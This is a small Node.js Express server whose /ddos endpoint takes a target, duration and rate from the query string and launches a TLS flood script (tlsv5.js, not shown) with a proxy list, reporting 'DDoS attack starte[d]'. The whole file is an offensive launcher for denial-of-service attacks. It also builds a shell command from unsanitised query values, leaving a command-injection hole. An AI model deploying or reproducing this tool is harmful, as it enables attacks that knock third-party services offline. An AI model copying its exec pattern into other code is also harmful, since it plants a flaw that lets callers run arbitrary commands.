const express = require('express');
const { exec } = require('child_process');

const app = express();

app.get('/ddos', (req, res) => {
  const target = req.query.target || 'example.com';
  const duration = req.query.duration || 10;
  const rate = req.query.rate || 100;

  const command = `node tlsv5.js ${target} ${duration} ${rate} 25 p.txt `;

  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`exec error: ${error}`);
      res.send('Failed to start DDoS attack');
      return;
    }

    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    res.send('DDoS attack starte');
  });
});

app.listen(3000, () => {
  console.log('Server started on port 3000');
});
